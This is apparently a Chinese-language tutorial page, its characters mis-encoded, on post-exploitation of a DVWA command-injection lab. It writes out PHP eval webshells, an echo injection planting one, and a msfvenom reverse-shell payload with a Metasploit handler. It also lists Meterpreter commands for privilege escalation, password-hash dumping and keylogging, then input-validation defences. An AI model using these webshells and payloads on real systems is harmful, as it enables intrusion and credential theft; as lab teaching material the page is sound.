&lt;h2 id=&#34;ğŸ¯-åæ¸—é€æ“ä½œ&#34;&gt;&lt;a href=&#34;#ğŸ¯-åæ¸—é€æ“ä½œ&#34; class=&#34;headerlink&#34; title=&#34;ğŸ¯ åæ¸—é€æ“ä½œ&#34;&gt;&lt;/a&gt;ğŸ¯ åæ¸—é€æ“ä½œ&lt;/h2&gt;&lt;h3 id=&#34;æ–¹æ³•ä¸€ï¼šä¸Šä¼ Webshell&#34;&gt;&lt;a href=&#34;#æ–¹æ³•ä¸€ï¼šä¸Šä¼ Webshell&#34; class=&#34;headerlink&#34; title=&#34;æ–¹æ³•ä¸€ï¼šä¸Šä¼ Webshell&#34;&gt;&lt;/a&gt;æ–¹æ³•ä¸€ï¼šä¸Šä¼ Webshell&lt;/h3&gt;&lt;h4 id=&#34;1-å‡†å¤‡ä¸€å¥è¯æœ¨é©¬&#34;&gt;&lt;a href=&#34;#1-å‡†å¤‡ä¸€å¥è¯æœ¨é©¬&#34; class=&#34;headerlink&#34; title=&#34;1. å‡†å¤‡ä¸€å¥è¯æœ¨é©¬&#34;&gt;&lt;/a&gt;1. å‡†å¤‡ä¸€å¥è¯æœ¨é©¬&lt;/h4&gt;&lt;p&gt;åˆ›å»º&lt;code&gt;shell.php&lt;/code&gt;æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; @&lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;pass&amp;#x27;&lt;/span&gt;]); &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;æˆ–è€…ä½¿ç”¨Base64ç¼–ç ç‰ˆæœ¬ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;base64_decode&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;])); &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;2-é€šè¿‡å‘½ä»¤æ³¨å…¥ä¸Šä¼ &#34;&gt;&lt;a href=&#34;#2-é€šè¿‡å‘½ä»¤æ³¨å…¥ä¸Šä¼ &#34; class=&#34;headerlink&#34; title=&#34;2. é€šè¿‡å‘½ä»¤æ³¨å…¥ä¸Šä¼ &#34;&gt;&lt;/a&gt;2. é€šè¿‡å‘½ä»¤æ³¨å…¥ä¸Šä¼ &lt;/h4&gt;&lt;p&gt;ä½¿ç”¨echoå‘½ä»¤å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;127.0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0.1&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; ^&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; @&lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;pass&amp;#x27;&lt;/span&gt;]); ?^&amp;gt; &amp;gt; C:\download\phpstudy\phpstudy_pro\WWW\DVWA\shell.php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;æ³¨æ„äº‹é¡¹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;^&lt;/code&gt;ç¬¦å·æ˜¯Windows cmdçš„è½¬ä¹‰ç¬¦&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;&lt;/code&gt;ç¬¦å·ç”¨äºé‡å®šå‘è¾“å‡ºåˆ°æ–‡ä»¶&lt;/li&gt;
&lt;li&gt;è·¯å¾„å¿…é¡»æ˜¯Webç›®å½•ä¸‹å¯è®¿é—®çš„ä½ç½®&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;3-éªŒè¯ä¸Šä¼ æˆåŠŸ&#34;&gt;&lt;a href=&#34;#3-éªŒè¯ä¸Šä¼ æˆåŠŸ&#34; class=&#34;headerlink&#34; title=&#34;3. éªŒè¯ä¸Šä¼ æˆåŠŸ&#34;&gt;&lt;/a&gt;3. éªŒè¯ä¸Šä¼ æˆåŠŸ&lt;/h4&gt;&lt;p&gt;è®¿é—®ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;http:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;147.136&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/DVWA/&lt;/span&gt;shell.php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;å¦‚æœé¡µé¢æ˜¾ç¤ºç©ºç™½ï¼Œè¯´æ˜PHPæ–‡ä»¶ä¸Šä¼ æˆåŠŸã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ–¹æ³•äºŒï¼šä½¿ç”¨èšå‰‘è¿æ¥&#34;&gt;&lt;a href=&#34;#æ–¹æ³•äºŒï¼šä½¿ç”¨èšå‰‘è¿æ¥&#34; class=&#34;headerlink&#34; title=&#34;æ–¹æ³•äºŒï¼šä½¿ç”¨èšå‰‘è¿æ¥&#34;&gt;&lt;/a&gt;æ–¹æ³•äºŒï¼šä½¿ç”¨èšå‰‘è¿æ¥&lt;/h3&gt;&lt;h4 id=&#34;1-é…ç½®èšå‰‘è¿æ¥&#34;&gt;&lt;a href=&#34;#1-é…ç½®èšå‰‘è¿æ¥&#34; class=&#34;headerlink&#34; title=&#34;1. é…ç½®èšå‰‘è¿æ¥&#34;&gt;&lt;/a&gt;1. é…ç½®èšå‰‘è¿æ¥&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;è¿æ¥å‚æ•°ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL: &lt;code&gt;http://192.168.147.136/DVWA/shell.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;å¯†ç : &lt;code&gt;pass&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ç¼–ç : &lt;code&gt;UTF-8&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ç±»å‹: &lt;code&gt;PHP&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;2-åŠŸèƒ½æ¼”ç¤º&#34;&gt;&lt;a href=&#34;#2-åŠŸèƒ½æ¼”ç¤º&#34; class=&#34;headerlink&#34; title=&#34;2. åŠŸèƒ½æ¼”ç¤º&#34;&gt;&lt;/a&gt;2. åŠŸèƒ½æ¼”ç¤º&lt;/h4&gt;&lt;p&gt;é€šè¿‡èšå‰‘å¯ä»¥å®ç°ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ–‡ä»¶ç®¡ç†ï¼šæµè§ˆã€ä¸Šä¼ ã€ä¸‹è½½ã€ç¼–è¾‘æ–‡ä»¶&lt;/li&gt;
&lt;li&gt;æ•°æ®åº“ç®¡ç†ï¼šè¿æ¥å’Œæ“ä½œæ•°æ®åº“&lt;/li&gt;
&lt;li&gt;è™šæ‹Ÿç»ˆç«¯ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤&lt;/li&gt;
&lt;li&gt;åå‘ä»£ç†ï¼šå»ºç«‹éš§é“è¿æ¥&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;æ–¹æ³•ä¸‰ï¼šMSFææƒæ“ä½œ&#34;&gt;&lt;a href=&#34;#æ–¹æ³•ä¸‰ï¼šMSFææƒæ“ä½œ&#34; class=&#34;headerlink&#34; title=&#34;æ–¹æ³•ä¸‰ï¼šMSFææƒæ“ä½œ&#34;&gt;&lt;/a&gt;æ–¹æ³•ä¸‰ï¼šMSFææƒæ“ä½œ&lt;/h3&gt;&lt;h4 id=&#34;1-ç”ŸæˆMeterpreteræœ¨é©¬&#34;&gt;&lt;a href=&#34;#1-ç”ŸæˆMeterpreteræœ¨é©¬&#34; class=&#34;headerlink&#34; title=&#34;1. ç”ŸæˆMeterpreteræœ¨é©¬&#34;&gt;&lt;/a&gt;1. ç”ŸæˆMeterpreteræœ¨é©¬&lt;/h4&gt;&lt;p&gt;åœ¨Kali Linuxä¸­æ‰§è¡Œï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight zsh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs zsh&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.147.129 LPORT=4444 -f exe &amp;gt; shell.exe&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;å‚æ•°è¯´æ˜ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-p&lt;/code&gt;: æŒ‡å®šPayloadç±»å‹&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LHOST&lt;/code&gt;: æ”»å‡»è€…IPåœ°å€&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LPORT&lt;/code&gt;: ç›‘å¬ç«¯å£&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-f&lt;/code&gt;: è¾“å‡ºæ ¼å¼&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;2-ä¸Šä¼ æœ¨é©¬æ–‡ä»¶&#34;&gt;&lt;a href=&#34;#2-ä¸Šä¼ æœ¨é©¬æ–‡ä»¶&#34; class=&#34;headerlink&#34; title=&#34;2. ä¸Šä¼ æœ¨é©¬æ–‡ä»¶&#34;&gt;&lt;/a&gt;2. ä¸Šä¼ æœ¨é©¬æ–‡ä»¶&lt;/h4&gt;&lt;p&gt;é€šè¿‡èšå‰‘å°†ç”Ÿæˆçš„&lt;code&gt;shell.exe&lt;/code&gt;ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight basic&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs basic&#34;&gt;C:\Users\Public\&lt;span class=&#34;hljs-keyword&#34;&gt;shell&lt;/span&gt;.exe&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;3-é…ç½®MSFç›‘å¬å™¨&#34;&gt;&lt;a href=&#34;#3-é…ç½®MSFç›‘å¬å™¨&#34; class=&#34;headerlink&#34; title=&#34;3. é…ç½®MSFç›‘å¬å™¨&#34;&gt;&lt;/a&gt;3. é…ç½®MSFç›‘å¬å™¨&lt;/h4&gt;&lt;p&gt;å¯åŠ¨Metasploitï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;msfconsole&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;é…ç½®ç›‘å¬å™¨ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;use exploit/multi/handler&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_tcp&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; lhost 192.168.147.129&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; lport 4444&lt;br&gt;exploit&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;4-æ‰§è¡Œæœ¨é©¬è·å–Meterpreterä¼šè¯&#34;&gt;&lt;a href=&#34;#4-æ‰§è¡Œæœ¨é©¬è·å–Meterpreterä¼šè¯&#34; class=&#34;headerlink&#34; title=&#34;4. æ‰§è¡Œæœ¨é©¬è·å–Meterpreterä¼šè¯&#34;&gt;&lt;/a&gt;4. æ‰§è¡Œæœ¨é©¬è·å–Meterpreterä¼šè¯&lt;/h4&gt;&lt;p&gt;åœ¨èšå‰‘ç»ˆç«¯æˆ–é€šè¿‡å‘½ä»¤æ³¨å…¥æ‰§è¡Œï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight vbnet&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs vbnet&#34;&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;C:&lt;/span&gt;\Users\&lt;span class=&#34;hljs-keyword&#34;&gt;Public&lt;/span&gt;\shell.exe&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;æˆåŠŸå»ºç«‹è¿æ¥åï¼Œå¯ä»¥ä½¿ç”¨Meterpreterçš„å¼ºå¤§åŠŸèƒ½ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs shell&#34;&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;è·å–ç³»ç»Ÿä¿¡æ¯&lt;/span&gt;&lt;br&gt;sysinfo&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;è·å–ç”¨æˆ·æƒé™&lt;/span&gt;&lt;br&gt;getuid&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;ææƒåˆ°SYSTEM&lt;/span&gt;&lt;br&gt;getsystem&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;è·å–å¯†ç å“ˆå¸Œ&lt;/span&gt;&lt;br&gt;hashdump&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;æˆªå±&lt;/span&gt;&lt;br&gt;screenshot&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;é”®ç›˜è®°å½•&lt;/span&gt;&lt;br&gt;keyscan_start&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;hr&gt;
&lt;h2 id=&#34;ğŸ›¡ï¸-é˜²æŠ¤æªæ–½&#34;&gt;&lt;a href=&#34;#ğŸ›¡ï¸-é˜²æŠ¤æªæ–½&#34; class=&#34;headerlink&#34; title=&#34;ğŸ›¡ï¸ é˜²æŠ¤æªæ–½&#34;&gt;&lt;/a&gt;ğŸ›¡ï¸ é˜²æŠ¤æªæ–½&lt;/h2&gt;&lt;h3 id=&#34;è¾“å…¥éªŒè¯å’Œè¿‡æ»¤&#34;&gt;&lt;a href=&#34;#è¾“å…¥éªŒè¯å’Œè¿‡æ»¤&#34; class=&#34;headerlink&#34; title=&#34;è¾“å…¥éªŒè¯å’Œè¿‡æ»¤&#34;&gt;&lt;/a&gt;è¾“å…¥éªŒè¯å’Œè¿‡æ»¤&lt;/h3&gt;&lt;h4 id=&#34;1-ç™½åå•éªŒè¯&#34;&gt;&lt;a href=&#34;#1-ç™½åå•éªŒè¯&#34; class=&#34;headerlink&#34; title=&#34;1. ç™½åå•éªŒè¯&#34;&gt;&lt;/a&gt;1. ç™½åå•éªŒè¯&lt;/h4&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;validateIP&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$ip&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// ä½¿ç”¨ç™½åå•éªŒè¯IPåœ°å€æ ¼å¼&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;filter_var&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$ip&lt;/span&gt;, FILTER_VALIDATE_IP)) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$ip&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ip&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$validIP&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;validateIP&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$validIP&lt;/span&gt;) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;shell_exec&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ping -c 4 &amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;escapeshellarg&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$validIP&lt;/span&gt;));&lt;br&gt;&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Invalid IP address&amp;quot;&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;2-ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤&#34;&gt;&lt;a href=&#34;#2-ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤&#34; class=&#34;headerlink&#34; title=&#34;2. ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤&#34;&gt;&lt;/a&gt;2. ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤&lt;/h4&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;filterDangerousChars&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$input&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// è¿‡æ»¤å±é™©å­—ç¬¦&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$dangerous&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;amp;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;|&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;`&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;$&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;(&amp;#x27;&lt;/span&gt;, &lt;span 